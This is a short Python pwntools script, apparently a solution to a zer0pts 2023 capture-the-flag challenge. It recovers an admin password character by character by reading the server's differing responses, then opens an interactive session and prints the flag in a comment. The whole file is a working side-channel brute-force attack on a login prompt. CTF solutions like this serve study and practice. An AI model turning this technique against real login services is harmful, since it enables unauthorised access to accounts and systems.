from pwn import *
from itertools import cycle

password = "dd79efc4093c9326"
# password = ""
for c in cycle("0123456789abcdef\n"):
    io = remote("misc.2023.zer0pts.com", "10021")
    io.sendline(b"admin")
    for p in password:
        io.send(p.encode())
    # predict
    io.send(c.encode())
    print(f"predict: {password} + {c}")
    msg = io.recvline(timeout=2)
    if b"Incorrect" in msg:
        pass
    elif len(msg) == 0:
        password += c
    elif b"Logged in" in msg:
        print(f"OK: {password}")
        io.interactive()
    io.close()
    time.sleep(0.5)

# $ secret/flag.txt
# zer0pts{d0Nt_r3sp0nd_t00_qu1ck}
